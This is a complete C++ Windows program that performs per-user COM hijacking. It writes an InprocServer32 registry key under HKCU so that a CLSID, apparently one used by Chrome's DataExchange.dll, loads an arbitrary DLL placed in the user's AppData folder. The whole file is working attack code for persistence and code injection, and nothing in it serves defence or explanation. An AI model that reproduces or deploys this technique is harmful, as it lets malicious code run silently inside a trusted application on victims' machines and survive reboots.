#include <windows.h>
#include <string>
#include <iostream>

bool SetPerUserCOMHijack(const std::wstring& clsid, const std::wstring& dllPath, const std::wstring& threadingModel) {
    HKEY hKey = nullptr;
    LONG result;

    // Registry path: HKCU\Software\Classes\CLSID\{CLSID}\InprocServer32
    std::wstring regPath = L"Software\\Classes\\CLSID\\" + clsid + L"\\InprocServer32";

    // Create or open the key
    result = RegCreateKeyExW(
        HKEY_CURRENT_USER,         // per-user hive
        regPath.c_str(),           // subkey
        0,                         // reserved
        nullptr,                   // class
        REG_OPTION_NON_VOLATILE,   // persistent
        KEY_SET_VALUE,             // we want to set values
        nullptr,                   // security attrs
        &hKey,
        nullptr
    );

    if (result != ERROR_SUCCESS) {
        std::wcerr << L"[!] RegCreateKeyEx failed: " << result << std::endl;
        return false;
    }

    // Set default value to DLL path
    result = RegSetValueExW(
        hKey,
        nullptr, // (default) value
        0,
        REG_SZ,
        reinterpret_cast<const BYTE*>(dllPath.c_str()),
        static_cast<DWORD>((dllPath.size() + 1) * sizeof(wchar_t))
    );

    if (result != ERROR_SUCCESS) {
        std::wcerr << L"[!] Failed to set default DLL path: " << result << std::endl;
        RegCloseKey(hKey);
        return false;
    }

    // Set ThreadingModel value
    result = RegSetValueExW(
        hKey,
        L"ThreadingModel",
        0,
        REG_SZ,
        reinterpret_cast<const BYTE*>(threadingModel.c_str()),
        static_cast<DWORD>((threadingModel.size() + 1) * sizeof(wchar_t))
    );

    if (result != ERROR_SUCCESS) {
        std::wcerr << L"[!] Failed to set ThreadingModel: " << result << std::endl;
        RegCloseKey(hKey);
        return false;
    }

    RegCloseKey(hKey);
    return true;
}



/* 
    the chrome usage of DataExchange.dll
    if for CLSID = 
*/
int wmain() {
    // Example usage
    std::wstring clsid = L"{9FC8E510-A27C-4B3B-B9A3-BF65F00256A8}";
    std::wstring dllPath = L"C:\\Users\\User\\AppData\\Local\\Microsoft\\kaki.dll";
    std::wstring threadingModel = L"Both"; // must match original COM server

    if (SetPerUserCOMHijack(clsid, dllPath, threadingModel)) {
        std::wcout << L"[+] COM hijack registry keys set successfully for " << clsid << std::endl;
    }
    else {
        std::wcerr << L"[!] Failed to set COM hijack registry keys" << std::endl;
    }

    return 0;
}
